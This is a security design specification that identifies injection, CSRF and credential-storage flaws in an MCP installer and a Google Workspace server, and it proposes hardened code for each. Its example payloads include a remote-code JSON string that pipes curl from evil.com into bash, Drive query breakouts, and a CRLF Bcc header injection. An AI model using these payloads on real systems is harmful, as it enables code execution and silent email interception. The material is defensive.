# ADW Security Design Specification -- Sprint 1

> Security Architect | Created: 2026-02-12 | Updated: 2026-02-12
> Scope: FR-S1-01 through FR-S1-11 + Input Validation Layer + Credential Storage Architecture + Security Logging
> Baseline: popup-jacob/popup-claude (master, commit 7b16685)
> Reference: docs/03-analysis/security-verification-report.md, docs/03-analysis/gap-security-verification.md

---

## Table of Contents

1. [FR-S1-01: OAuth State Parameter (CSRF Protection)](#fr-s1-01-oauth-state-parameter)
2. [FR-S1-02: Drive API Query Escaping](#fr-s1-02-drive-api-query-escaping)
3. [FR-S1-03: osascript Template Injection](#fr-s1-03-osascript-template-injection)
4. [FR-S1-04: Atlassian Token Secure Storage](#fr-s1-04-atlassian-token-secure-storage)
5. [FR-S1-06: Docker Non-Root User](#fr-s1-06-docker-non-root-user)
6. [FR-S1-07: token.json File Permissions](#fr-s1-07-tokenjson-file-permissions)
7. [FR-S1-08: Config Directory Permissions](#fr-s1-08-config-directory-permissions)
8. [FR-S1-09: Atlassian install.sh Variable Escaping](#fr-s1-09-atlassian-installsh-variable-escaping)
9. [FR-S1-10: Gmail Header Injection](#fr-s1-10-gmail-header-injection)
10. [FR-S1-11: Remote Script Download Integrity Verification](#fr-s1-11-remote-script-download-integrity-verification)
11. [Input Validation Layer](#input-validation-layer)
12. [Security Event Logging](#security-event-logging)
13. [Secure Credential Storage Architecture](#secure-credential-storage-architecture)
14. [Security Invariant Summary](#security-invariant-summary)
15. [Change History](#change-history)

---

### Notes on Out-of-Design-Scope Issues

> **SEC-03 (Figma token exposure) downgrade record:** SEC-03 was originally reported as Critical in the verification report, but during verification it was confirmed that the `{accessToken}` value is a **template placeholder**, not an actual token, and was downgraded to **Informational** (see security-verification-report.md SEC-03). Accordingly, it was assigned Low priority as FR-S1-05 in the plan, and is excluded from design targets in this document. Changing the placeholder name to `<REPLACE_WITH_TOKEN>` etc. is recommended in the future, but there is no security risk.
>
> **SEC-06 (Windows admin privileges), SEC-07 (excessive OAuth scopes):** These are in Sprint 2 and Sprint 4 scope respectively, so they are not included in this Sprint 1 design document. They will be designed separately in their respective Sprint design documents.

---

## FR-S1-01: OAuth State Parameter

**Verification Report Reference:** SEC-08
**OWASP Mapping:** A07 -- Identification and Authentication Failures
**Severity:** High
**Effort:** 1-2 hours

### 1. Current Vulnerability

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/auth/oauth.ts`
**Lines:** 113-118

```typescript
async function getTokenFromBrowser(oauth2Client: OAuth2Client): Promise<TokenData> {
  const authUrl = oauth2Client.generateAuthUrl({
    access_type: "offline",
    scope: SCOPES,
    prompt: "consent",
  });
```

And the callback handler at lines 126-128:

```typescript
if (url.pathname === "/callback") {
  const code = url.searchParams.get("code");
```

**Problem:** The OAuth authorization URL is generated without a `state` parameter. The callback handler accepts any authorization code without verifying its origin. An attacker can exploit this by:

1. Initiating their own OAuth flow on a separate machine.
2. Capturing the authorization URL redirect.
3. Tricking the victim into visiting `http://localhost:PORT/callback?code=ATTACKER_CODE`.
4. The application stores a token linked to the attacker's Google account.
5. Any data the user subsequently sends through the MCP server (emails, documents) goes to the attacker's account.

### 2. Refactored Design

```typescript
import * as crypto from "crypto";

/**
 * Handle OAuth callback from browser login.
 * Generates a cryptographic state token for CSRF protection (RFC 6749 Section 10.12).
 */
async function getTokenFromBrowser(oauth2Client: OAuth2Client): Promise<TokenData> {
  // Generate cryptographically random state parameter (32 bytes = 64 hex chars)
  const state = crypto.randomBytes(32).toString("hex");

  const authUrl = oauth2Client.generateAuthUrl({
    access_type: "offline",
    scope: SCOPES,
    prompt: "consent",
    state,
  });

  return new Promise((resolve, reject) => {
    let timeoutId: NodeJS.Timeout;

    const server = http.createServer(async (req, res) => {
      try {
        const url = new URL(req.url || "", `http://localhost:${OAUTH_PORT}`);

        if (url.pathname === "/callback") {
          // --- STATE VALIDATION (CSRF protection) ---
          const receivedState = url.searchParams.get("state");
          if (receivedState !== state) {
            res.writeHead(403, { "Content-Type": "text/html; charset=utf-8" });
            res.end(`
              <html>
                <head><title>Authentication Failed</title></head>
                <body style="font-family: sans-serif; text-align: center; padding: 50px;">
                  <h1>Authentication failed: Invalid state parameter</h1>
                  <p>This may indicate a CSRF attack. Please try again.</p>
                </body>
              </html>
            `);
            clearTimeout(timeoutId);
            server.close();
            reject(new Error("OAuth state mismatch - possible CSRF attack"));
            return;
          }

          const code = url.searchParams.get("code");

          if (!code) {
            res.writeHead(400, { "Content-Type": "text/html; charset=utf-8" });
            res.end("<h1>Error: No authorization code received.</h1>");
            clearTimeout(timeoutId);
            server.close();
            reject(new Error("No authorization code received."));
            return;
          }

          const { tokens } = await oauth2Client.getToken(code);
          oauth2Client.setCredentials(tokens);

          res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
          res.end(`
            <html>
              <head><title>Authentication Complete</title></head>
              <body style="font-family: sans-serif; text-align: center; padding: 50px;">
                <h1>Google authentication complete!</h1>
                <p>You can close this window and return to Claude.</p>
              </body>
            </html>
          `);

          clearTimeout(timeoutId);
          server.close();
          resolve(tokens as TokenData);
        }
      } catch (error) {
        res.writeHead(500, { "Content-Type": "text/html; charset=utf-8" });
        res.end("<h1>An error occurred.</h1>");
        clearTimeout(timeoutId);
        server.close();
        reject(error);
      }
    });

    server.listen(OAUTH_PORT, () => {
      console.error("\n========================================");
      console.error("Google Login Required!");
      console.error("========================================");
      console.error("\nOpen the following URL in your browser:\n");
      console.error(authUrl);
      console.error("\n========================================\n");

      open(authUrl).catch(() => {});
    });

    // 5 minute timeout
    timeoutId = setTimeout(() => {
      server.close();
      reject(new Error("Login timeout (5 minutes)"));
    }, 5 * 60 * 1000);
  });
}
```

### 3. Security Invariant

**Property:** Every OAuth callback must carry a `state` parameter that matches the cryptographically random value generated at the start of the same authorization flow. A mismatch results in immediate rejection with HTTP 403 and the server shutting down. The state value is generated per-flow using `crypto.randomBytes(32)`, providing 256 bits of entropy -- computationally infeasible to guess or brute-force within the 5-minute timeout window.

**OWASP A07 Guarantee:** Cross-Site Request Forgery against the OAuth callback endpoint is prevented. An attacker cannot trick the local callback server into accepting an authorization code from a different OAuth flow.

---

## FR-S1-02: Drive API Query Escaping

**Verification Report Reference:** GWS-07
**OWASP Mapping:** A03 -- Injection
**Severity:** High
**Effort:** 2-3 hours

### 1. Current Vulnerability

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/tools/drive.ts`
**Line 18:**

```typescript
let q = `name contains '${query}' and trashed = false`;
```

**Line 59:**

```typescript
q: `'${folderId}' in parents and trashed = false`,
```

**Problem:** User-supplied `query` and `folderId` are interpolated directly into Google Drive API query strings. The Google Drive API uses its own query language where single quotes delimit string values. An input containing a single quote breaks out of the string context and injects arbitrary query operators.

**Exploitation example for `drive_search`:**
- Input: `test' or name contains '`
- Resulting query: `name contains 'test' or name contains '' and trashed = false`
- Effect: Returns all files (bypasses the intended search filter).

**Exploitation example for `drive_list`:**
- Input: `root' in parents or '1`
- Resulting query: `'root' in parents or '1' in parents and trashed = false`
- Effect: Lists files from arbitrary folders in shared drives.

### 2. Refactored Design

Add a shared utility module and apply escaping at every injection point.

**New file: `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/utils/sanitize.ts`**

```typescript
/**
 * Escape a string value for use in Google Drive API query language.
 *
 * The Drive API query language uses single quotes to delimit string values.
 * Backslashes escape the next character. We must escape both backslashes
 * (to prevent escape sequence injection) and single quotes (to prevent
 * string breakout).
 *
 * Reference: https://developers.google.com/drive/api/guides/search-files
 */
export function escapeDriveQuery(input: string): string {
  return input.replace(/\\/g, "\\\\").replace(/'/g, "\\'");
}

/**
 * Validate that a string matches the format of a Google Drive file/folder ID.
 *
 * Google Drive IDs consist of alphanumeric characters, hyphens, and underscores.
 * Rejecting anything else prevents query injection via the folderId parameter.
 */
export const DRIVE_ID_PATTERN = /^[a-zA-Z0-9_-]+$/;

export function validateDriveId(id: string, fieldName: string): void {
  if (id !== "root" && !DRIVE_ID_PATTERN.test(id)) {
    throw new Error(`Invalid ${fieldName} format. Expected alphanumeric characters, hyphens, and underscores.`);
  }
}
```

**Modified file: `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/tools/drive.ts`**

Changes at line 18 (`drive_search` handler):

```typescript
import { escapeDriveQuery, validateDriveId } from "../utils/sanitize.js";

// ... inside drive_search handler:
handler: async ({ query, mimeType, maxResults }: { query: string; mimeType?: string; maxResults: number }) => {
  const { drive } = await getGoogleServices();

  let q = `name contains '${escapeDriveQuery(query)}' and trashed = false`;
  if (mimeType) {
    q += ` and mimeType = '${escapeDriveQuery(mimeType)}'`;
  }

  // ... rest unchanged
```

Changes at line 55-59 (`drive_list` handler):

```typescript
// ... inside drive_list handler:
handler: async ({ folderId, maxResults, orderBy }: { folderId: string; maxResults: number; orderBy: string }) => {
  validateDriveId(folderId, "folderId");
  const { drive } = await getGoogleServices();

  const response = await drive.files.list({
    q: `'${escapeDriveQuery(folderId)}' in parents and trashed = false`,
    // ... rest unchanged
```

Additionally, apply `validateDriveId` to every handler that takes a `fileId` parameter (`drive_get_file`, `drive_copy`, `drive_move`, `drive_rename`, `drive_delete`, `drive_restore`, `drive_share`, `drive_share_link`, `drive_unshare`, `drive_list_permissions`):

```typescript
// Example for drive_get_file:
handler: async ({ fileId }: { fileId: string }) => {
  validateDriveId(fileId, "fileId");
  const { drive } = await getGoogleServices();
  // ... rest unchanged
```

### 3. Security Invariant

**Property:** No user-supplied string can break out of a single-quoted string literal in the Google Drive API query language. All single quotes in user input are escaped to `\'` and all backslashes are escaped to `\\`, making it impossible to inject query operators. File/folder IDs are validated against the pattern `^[a-zA-Z0-9_-]+$` (plus the literal `"root"`), rejecting any input that could contain query syntax characters.

**OWASP A03 Guarantee:** Injection via the Google Drive query language is prevented. The query structure is immutable regardless of user input content.

---

## FR-S1-03: osascript Template Injection

**Verification Report Reference:** SEC-08a
**OWASP Mapping:** A03 -- Injection
**Severity:** High
**Effort:** 3-4 hours

### 1. Current Vulnerability

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/install.sh`
**Lines:** 29-39

```bash
parse_json() {
    local json="$1"
    local key="$2"
    osascript -l JavaScript -e "
        var obj = JSON.parse(\`$json\`);
        var keys = '$key'.split('.');
        var val = obj;
        for (var k of keys) val = val ? val[k] : undefined;
        val === undefined ? '' : String(val);
    " 2>/dev/null || echo ""
}
```

And at line 104:

```bash
local module_names=$(osascript -l JavaScript -e "JSON.parse(\`$modules_json\`).modules.map(m => m.name).join(' ')" 2>/dev/null)
```

**Problem:** The `$json` variable -- which may contain data fetched from a remote server via `curl` -- is interpolated directly into a JavaScript template literal (backtick string) executed by `osascript`. JavaScript template literals support `${expression}` interpolation. If the JSON contains backticks or `${...}` sequences, they are interpreted as JavaScript code running with the user's macOS session privileges.

**Exploitation example via crafted module.json:**
```json
{"name": "${require('child_process').execSync('curl http://evil.com/pwn | bash')}"}
```
This would execute arbitrary shell commands on the installer's macOS host.

### 2. Refactored Design

Replace `osascript` with `node` (which the installer already requires) using stdin piping to avoid any shell interpolation of user data.

```bash
# JSON parser using Node.js with stdin (safe from injection)
parse_json() {
    local json="$1"
    local key="$2"

    # Pass JSON via stdin and key via argv -- no shell interpolation of data
    echo "$json" | node -e "
        let data = '';
        process.stdin.setEncoding('utf8');
        process.stdin.on('data', chunk => data += chunk);
        process.stdin.on('end', () => {
            try {
                const obj = JSON.parse(data);
                const keys = process.argv[1].split('.');
                let val = obj;
                for (const k of keys) val = val ? val[k] : undefined;
                process.stdout.write(val === undefined ? '' : String(val));
            } catch (e) {
                process.stdout.write('');
            }
        });
    " "$key" 2>/dev/null || echo ""
}
```

And replace line 104:

```bash
# Safe: pass JSON via stdin, extract module names via argv
local module_names=$(echo "$modules_json" | node -e "
    let data = '';
    process.stdin.setEncoding('utf8');
    process.stdin.on('data', chunk => data += chunk);
    process.stdin.on('end', () => {
        try {
            const parsed = JSON.parse(data);
            process.stdout.write(parsed.modules.map(m => m.name).join(' '));
        } catch (e) {
            process.stdout.write('');
        }
    });
" 2>/dev/null)
```

**Design rationale:**
- `echo "$json" | node -e "..."` pipes data through stdin. The stdin stream is read programmatically by Node.js -- it never passes through the shell's string parsing or JavaScript's template literal engine.
- The `key` argument is passed via `process.argv[1]`, not shell interpolation. While the key comes from hardcoded strings in the installer (not user input), using argv is still safer than string interpolation.
- `node` is already a required dependency (checked and installed in the base module). The `osascript` approach was a macOS-only workaround; switching to `node` makes the installer portable to Linux as well.
- `process.stdout.write` is used instead of `console.log` to avoid a trailing newline that would affect value comparisons.

### 3. Security Invariant

**Property:** No data from remote JSON files (module.json, modules.json) is ever interpolated into a code execution context (template literals, eval, or shell strings). Data flows exclusively through stdin/stdout pipes and argv, which are not subject to code interpretation. Even if an attacker compromises the remote JSON source, they cannot achieve code execution through the `parse_json` function.

**OWASP A03 Guarantee:** JavaScript injection via the JSON parsing path is eliminated. The code execution boundary (the `node -e` script) is a static string literal that never incorporates user data.

---

## FR-S1-04: Atlassian Token Secure Storage

**Verification Report Reference:** SEC-02
**OWASP Mapping:** A02 -- Cryptographic Failures
**Severity:** Critical
**Effort:** 4-6 hours

### 1. Current Vulnerability

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/modules/atlassian/install.sh`
**Lines:** 147-172

```bash
node -e "
const fs = require('fs');
const configPath = '$MCP_CONFIG_PATH';
...
config.mcpServers['atlassian'] = {
    command: 'docker',
    args: [
        'run', '-i', '--rm',
        '-e', 'CONFLUENCE_URL=$confluenceUrl',
        '-e', 'CONFLUENCE_USERNAME=$email',
        '-e', 'CONFLUENCE_API_TOKEN=$apiToken',
        '-e', 'JIRA_URL=$jiraUrl',
        '-e', 'JIRA_USERNAME=$email',
        '-e', 'JIRA_API_TOKEN=$apiToken',
        'ghcr.io/sooperset/mcp-atlassian:latest'
    ]
};
fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
"
```

**Problem:** The Atlassian API token is written as a plaintext string into `~/.mcp.json` inside the Docker `args` array. This has multiple exposure vectors:

1. `~/.mcp.json` is created with default permissions (typically 0644 = world-readable).
2. The token is visible in `docker inspect` output.
3. The token appears in `ps aux` output (process argument list).
4. Any application with read access to the home directory can extract the token.
5. If `.mcp.json` is accidentally committed to version control, the token is exposed.

### 2. Refactored Design

Store credentials in a dedicated `.env` file with restrictive permissions, and reference it via Docker's `--env-file` flag.

```bash
    # --- Secure credential storage ---
    ENV_DIR="$HOME/.atlassian-mcp"
    ENV_FILE="$ENV_DIR/credentials.env"

    # Create directory with owner-only access
    mkdir -p "$ENV_DIR"
    chmod 700 "$ENV_DIR"

    # Write credentials to env file (owner-only read/write)
    cat > "$ENV_FILE" << ENVEOF
CONFLUENCE_URL=$confluenceUrl
CONFLUENCE_USERNAME=$email
CONFLUENCE_API_TOKEN=$apiToken
JIRA_URL=$jiraUrl
JIRA_USERNAME=$email
JIRA_API_TOKEN=$apiToken
ENVEOF
    chmod 600 "$ENV_FILE"

    echo -e "  ${GREEN}Credentials saved to $ENV_FILE (permissions: 600)${NC}"

    # --- Update .mcp.json using env vars (no shell interpolation) ---
    echo ""
    echo -e "${YELLOW}[Config] Updating .mcp.json...${NC}"

    MCP_CONFIG_PATH="$HOME/.mcp.json" \
    ATLASSIAN_ENV_FILE="$ENV_FILE" \
    node -e "
const fs = require('fs');
const configPath = process.env.MCP_CONFIG_PATH;
const envFile = process.env.ATLASSIAN_ENV_FILE;

let config = { mcpServers: {} };

if (fs.existsSync(configPath)) {
    config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    if (!config.mcpServers) config.mcpServers = {};
}

config.mcpServers['atlassian'] = {
    command: 'docker',
    args: [
        'run', '-i', '--rm',
        '--env-file', envFile,
        'ghcr.io/sooperset/mcp-atlassian:latest'
    ]
};

fs.writeFileSync(configPath, JSON.stringify(config, null, 2), { mode: 0o600 });
"
    echo -e "  ${GREEN}OK${NC}"
```

**Design details:**

| Aspect | Before | After |
|--------|--------|-------|
| Token location | Inline in `~/.mcp.json` args array | Separate `~/.atlassian-mcp/credentials.env` |
| File permissions | Default (0644) | 0600 (owner read/write only) |
| Directory permissions | Default (0755) | 0700 (owner only) |
| Visibility in `ps` | Yes (shown in `-e` args) | No (`--env-file` does not expose values) |
| Visibility in `docker inspect` | Yes (in command args) | Yes in env section, but not in command args |
| `.mcp.json` content | Contains raw token string | Contains only path to env file |

### 3. Security Invariant

**Property:** Credentials are never stored in `.mcp.json`. The `.mcp.json` file contains only a reference (file path) to the credentials file. The credentials file is created with 0600 permissions and its parent directory with 0700 permissions. Credentials are passed to Docker via `--env-file`, which does not expose values in process argument lists. The `.mcp.json` file itself is also written with 0600 permissions.

**OWASP A02 Guarantee:** Sensitive authentication material (API tokens) is stored with restrictive file permissions and is not visible in process listings, config files shared between tools, or Docker inspection of command arguments.

---

## FR-S1-06: Docker Non-Root User

**Verification Report Reference:** SEC-05
**OWASP Mapping:** A05 -- Security Misconfiguration
**Severity:** High
**Effort:** 2-3 hours

### 1. Current Vulnerability

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/Dockerfile`
**Lines:** 1-39 (entire file)

```dockerfile
# Production stage
FROM node:20-slim

WORKDIR /app

COPY package*.json ./
RUN npm install --omit=dev

COPY --from=builder /app/dist ./dist

RUN mkdir -p /app/.google-workspace

VOLUME ["/app/.google-workspace"]

ENV GOOGLE_CONFIG_DIR=/app/.google-workspace

CMD ["node", "dist/index.js"]
```

**Problem:** The production container runs as `root` (the default user in `node:20-slim`). If an attacker exploits a vulnerability in the Node.js application or any of its dependencies, they gain root access inside the container. This facilitates:

1. Container escape via kernel exploits (root is required for most known escape vectors).
2. Arbitrary file system access within the container.
3. Modification of mounted volumes (the `.google-workspace` directory containing OAuth tokens).
4. Network-based attacks against other containers or the host.

### 2. Refactored Design

```dockerfile
# Build stage
FROM node:20-slim AS builder

WORKDIR /app

# Copy dependency files
COPY package*.json ./
COPY tsconfig.json ./

# Install all dependencies (including dev deps for build)
RUN npm ci

# Copy source and build
COPY src ./src
RUN npm run build

# Production stage
FROM node:20-slim

WORKDIR /app

# Create non-root user and group
RUN groupadd -r mcp && useradd -r -g mcp -d /app -s /bin/false mcp

# Copy dependency files and install production deps only
COPY package*.json ./
RUN npm ci --omit=dev

# Copy built artifacts from builder
COPY --from=builder /app/dist ./dist

# Create config directory with correct ownership
RUN mkdir -p /app/.google-workspace && \
    chown -R mcp:mcp /app

# Switch to non-root user BEFORE declaring VOLUME
USER mcp

# Volume mount point
VOLUME ["/app/.google-workspace"]

# Environment
ENV GOOGLE_CONFIG_DIR=/app/.google-workspace
ENV NODE_ENV=production

# Health check (optional, for orchestration)
HEALTHCHECK --interval=30s --timeout=5s --retries=3 \
  CMD node -e "process.exit(0)"

# Run
CMD ["node", "dist/index.js"]
```

**Additional changes in build stage:** Replaced `npm install` with `npm ci` to ensure deterministic builds from `package-lock.json` (also addresses OWASP A08 -- Software and Data Integrity Failures).

**Volume permission compatibility:** The host-side directory `~/.google-workspace` must be writable by the container user (UID of the `mcp` user). The Google module installer (`installer/modules/google/install.sh`) should set the host directory permissions:

```bash
CONFIG_DIR="$HOME/.google-workspace"
mkdir -p "$CONFIG_DIR"
chmod 700 "$CONFIG_DIR"
# Get the mcp user's UID from the Docker image
MCP_UID=$(docker run --rm ghcr.io/popup-jacob/google-workspace-mcp:latest id -u mcp 2>/dev/null || echo "1000")
# If running on Linux, chown to match container UID
if [[ "$OSTYPE" != "darwin"* ]]; then
    sudo chown "$MCP_UID:$MCP_UID" "$CONFIG_DIR" 2>/dev/null || true
fi
# On macOS, Docker Desktop handles UID mapping automatically
```

### 3. Security Invariant

**Property:** The Node.js application runs as an unprivileged user (`mcp`) with no login shell (`/bin/false`). The user has write access only to `/app` and its subdirectories. Root is not available within the running container. This limits the blast radius of any application-level compromise to the `/app` directory and prevents most known container escape techniques that require root.

**OWASP A05 Guarantee:** The container follows the principle of least privilege. The application process cannot modify system files, install packages, or perform privileged operations.

---

## FR-S1-07: token.json File Permissions

**Verification Report Reference:** SEC-04
**OWASP Mapping:** A02 -- Cryptographic Failures
**Severity:** High
**Effort:** 1 hour (gap analysis D-03 reflected: increased from 0.5h to include existing file migration + Windows compatibility testing)

### 1. Current Vulnerability

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/auth/oauth.ts`
**Lines:** 105-108

```typescript
function saveToken(token: TokenData): void {
  ensureConfigDir();
  fs.writeFileSync(TOKEN_PATH, JSON.stringify(token, null, 2));
}
```

**Problem:** `fs.writeFileSync` without a `mode` option creates the file with default permissions derived from the process umask. On most systems, the default umask (0022) produces file permissions of 0644, meaning the token file is world-readable. Any user or process on the system can read the OAuth access token and refresh token.

### 2. Refactored Design

```typescript
/**
 * Save token to disk with restrictive permissions.
 *
 * The token file contains OAuth access_token and refresh_token.
 * It MUST be readable only by the file owner (mode 0600).
 *
 * On Windows, Node.js ignores the mode parameter -- Windows ACLs
 * are inherited from the parent directory. For Docker-based usage
 * (the primary deployment model), Linux permissions apply.
 */
function saveToken(token: TokenData): void {
  ensureConfigDir();
  fs.writeFileSync(TOKEN_PATH, JSON.stringify(token, null, 2), { mode: 0o600 });

  // Defensive: explicitly set permissions in case the file already existed
  // with different permissions from a previous version
  try {
    fs.chmodSync(TOKEN_PATH, 0o600);
  } catch {
    // chmodSync may fail on Windows -- acceptable since Windows
    // uses ACLs inherited from the parent directory
  }
}
```

### 3. Security Invariant

**Property:** The `token.json` file is always created with permissions 0600 (owner read/write only). If the file already exists with weaker permissions from a prior version, `chmodSync` corrects them. No other user on the system can read the OAuth tokens.

**OWASP A02 Guarantee:** Sensitive cryptographic material (OAuth tokens) is protected at rest with operating system file permissions, limiting access to the file owner.

---

## FR-S1-08: Config Directory Permissions

**Verification Report Reference:** SEC-04 (related)
**OWASP Mapping:** A02 -- Cryptographic Failures
**Severity:** High
**Effort:** 1 hour

### 1. Current Vulnerability

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/auth/oauth.ts`
**Lines:** 51-55

```typescript
function ensureConfigDir(): void {
  if (!fs.existsSync(CONFIG_DIR)) {
    fs.mkdirSync(CONFIG_DIR, { recursive: true });
  }
}
```

**Problem:** `fs.mkdirSync` with `recursive: true` creates the directory with default permissions (typically 0755 under umask 0022). This means other users on the system can list directory contents, traverse into the directory, and read any files within it that have group/other read permissions.

### 2. Refactored Design

```typescript
/**
 * Ensure the config directory exists with restrictive permissions.
 *
 * The config directory contains:
 *   - client_secret.json (OAuth client credentials)
 *   - token.json (OAuth access/refresh tokens)
 *
 * Both are sensitive. The directory MUST be owner-only (mode 0700).
 */
function ensureConfigDir(): void {
  if (!fs.existsSync(CONFIG_DIR)) {
    fs.mkdirSync(CONFIG_DIR, { recursive: true, mode: 0o700 });
  }

  // Defensive: fix permissions if directory already existed with weaker mode
  try {
    const stats = fs.statSync(CONFIG_DIR);
    const currentMode = stats.mode & 0o777;
    if (currentMode !== 0o700) {
      fs.chmodSync(CONFIG_DIR, 0o700);
    }
  } catch {
    // chmodSync may fail on Windows -- acceptable
  }
}
```

### 3. Security Invariant

**Property:** The `.google-workspace` directory is always set to mode 0700 (owner read/write/execute only). Other users cannot list, enter, or read any files in the directory. If the directory pre-exists with weaker permissions, they are corrected on every call to `ensureConfigDir()`.

**OWASP A02 Guarantee:** The container directory for sensitive credential files is access-restricted to the owner, preventing unauthorized disclosure of OAuth client secrets and tokens.

---

## FR-S1-09: Atlassian install.sh Variable Escaping

**Verification Report Reference:** SEC-12
**OWASP Mapping:** A03 -- Injection
**Severity:** Medium
**Effort:** 3-4 hours

### 1. Current Vulnerability

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/installer/modules/atlassian/install.sh`
**Lines:** 147-172

```bash
node -e "
const fs = require('fs');
const configPath = '$MCP_CONFIG_PATH';
let config = { mcpServers: {} };

if (fs.existsSync(configPath)) {
    config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    if (!config.mcpServers) config.mcpServers = {};
}

config.mcpServers['atlassian'] = {
    command: 'docker',
    args: [
        'run', '-i', '--rm',
        '-e', 'CONFLUENCE_URL=$confluenceUrl',
        '-e', 'CONFLUENCE_USERNAME=$email',
        '-e', 'CONFLUENCE_API_TOKEN=$apiToken',
        '-e', 'JIRA_URL=$jiraUrl',
        '-e', 'JIRA_USERNAME=$email',
        '-e', 'JIRA_API_TOKEN=$apiToken',
        'ghcr.io/sooperset/mcp-atlassian:latest'
    ]
};

fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
"
```

**Problem:** Shell variables (`$confluenceUrl`, `$email`, `$apiToken`, `$jiraUrl`, `$MCP_CONFIG_PATH`) are expanded by the shell before being passed to `node -e`. If any of these values contain characters that are meaningful to JavaScript (single quotes, backticks, backslashes, newlines) or to the shell (double quotes, dollar signs), the behavior is undefined. Specifically:

- A single quote (`'`) breaks JavaScript string literals, causing parse errors or arbitrary code execution.
- A backtick (`` ` ``) starts a JavaScript template literal.
- A `$` followed by characters can trigger additional shell expansion.
- A newline breaks the inline script.

An API token from Atlassian is a base64-like string that could contain special characters. A maliciously crafted URL or email could achieve arbitrary code execution in the Node.js process.

The same pattern exists in `installer/modules/google/install.sh` at lines 330-346.

### 2. Refactored Design

Pass all dynamic values via environment variables, never through shell interpolation.

**For `installer/modules/atlassian/install.sh` (lines 142-172):**

```bash
    # Update .mcp.json using Node.js -- pass values via env vars, not interpolation
    echo ""
    echo -e "${YELLOW}[Config] Updating .mcp.json...${NC}"

    MCP_CONFIG_PATH="$HOME/.mcp.json" \
    ATLASSIAN_CONFLUENCE_URL="$confluenceUrl" \
    ATLASSIAN_EMAIL="$email" \
    ATLASSIAN_API_TOKEN="$apiToken" \
    ATLASSIAN_JIRA_URL="$jiraUrl" \
    ATLASSIAN_ENV_FILE="$ENV_FILE" \
    node -e "
const fs = require('fs');
const configPath = process.env.MCP_CONFIG_PATH;
const envFile = process.env.ATLASSIAN_ENV_FILE;

let config = { mcpServers: {} };

if (fs.existsSync(configPath)) {
    config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    if (!config.mcpServers) config.mcpServers = {};
}

config.mcpServers['atlassian'] = {
    command: 'docker',
    args: [
        'run', '-i', '--rm',
        '--env-file', envFile,
        'ghcr.io/sooperset/mcp-atlassian:latest'
    ]
};

fs.writeFileSync(configPath, JSON.stringify(config, null, 2), { mode: 0o600 });
"
    echo -e "  ${GREEN}OK${NC}"
```

**For `installer/modules/google/install.sh` (lines 325-346):**

```bash
echo ""
echo -e "${YELLOW}[Config] Updating .mcp.json...${NC}"

MCP_CONFIG_PATH="$HOME/.mcp.json" \
GOOGLE_CONFIG_DIR="$CONFIG_DIR" \
node -e "
const fs = require('fs');
const configPath = process.env.MCP_CONFIG_PATH;
const configDir = process.env.GOOGLE_CONFIG_DIR;

let config = { mcpServers: {} };

if (fs.existsSync(configPath)) {
    config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    if (!config.mcpServers) config.mcpServers = {};
}

config.mcpServers['google-workspace'] = {
    command: 'docker',
    args: ['run', '-i', '--rm', '-v', configDir + ':/app/.google-workspace', 'ghcr.io/popup-jacob/google-workspace-mcp:latest']
};

fs.writeFileSync(configPath, JSON.stringify(config, null, 2), { mode: 0o600 });
"
echo -e "  ${GREEN}OK${NC}"
```

**Design principle:** The `node -e "..."` script string is a static literal. All dynamic data reaches Node.js exclusively through `process.env`, which the shell populates via the `VAR=value` prefix before `node`. Inside Node.js, `process.env` values are plain strings -- they cannot inject code into the script.

### 3. Security Invariant

**Property:** The `node -e` inline script is a compile-time constant string. No user-supplied data (URLs, email addresses, API tokens, file paths) is interpolated into the script. All dynamic values are accessed via `process.env.*`, which provides a clean data/code separation. No combination of special characters in any input variable can alter the behavior of the Node.js script.

**OWASP A03 Guarantee:** Shell-to-JavaScript injection is eliminated. The code execution boundary is a fixed string and user data flows only through environment variables (a data channel, not a code channel).

---

## FR-S1-10: Gmail Header Injection

**Verification Report Reference:** GWS-08
**OWASP Mapping:** A03 -- Injection
**Severity:** Medium
**Effort:** 2 hours

### 1. Current Vulnerability

**File:** `/Users/popup-kay/Documents/GitHub/popup/popup-claude/google-workspace-mcp/src/tools/gmail.ts`
**Lines:** 110-121

```typescript
handler: async ({ to, subject, body, cc, bcc }: { to: string; subject: string; body: string; cc?: string; bcc?: string }) => {
  const { gmail } = await getGoogleServices();

  const messageParts = [
    `To: ${to}`,
    cc ? `Cc: ${cc}` : "",
    bcc ? `Bcc: ${bcc}` : "",
    `Subject: =?UTF-8?B?${Buffer.from(subject).toString("base64")}?=`,
    "Content-Type: text/plain; charset=utf-8",
    "",
    body,
  ].filter(Boolean).join("\n");
```

The same pattern exists in `gmail_draft_create` at lines 152-162:

```typescript
handler: async ({ to, subject, body, cc }: { to: string; subject: string; body: string; cc?: string }) => {
  const { gmail } = await getGoogleServices();

  const messageParts = [
    `To: ${to}`,
    cc ? `Cc: ${cc}` : "",
    `Subject: =?UTF-8?B?${Buffer.from(subject).toString("base64")}?=`,
    "Content-Type: text/plain; charset=utf-8",
    "",
    body,
  ].filter(Boolean).join("\n");
```

**Problem:** The `to`, `cc`, and `bcc` fields are interpolated directly into RFC 2822 email headers without sanitization. If any of these values contain CRLF (`\r\n`) or LF (`\n`) sequences, an attacker can inject arbitrary headers.

**Exploitation example:**
- Input `to`: `victim@example.com\r\nBcc: attacker@evil.com`
- Resulting headers:
  ```
  To: victim@example.com
  Bcc: attacker@evil.com
  Subject: ...
  ```
- Effect: A copy of every email sent through the MCP server is silently forwarded to the attacker.

### 2. Refactored Design

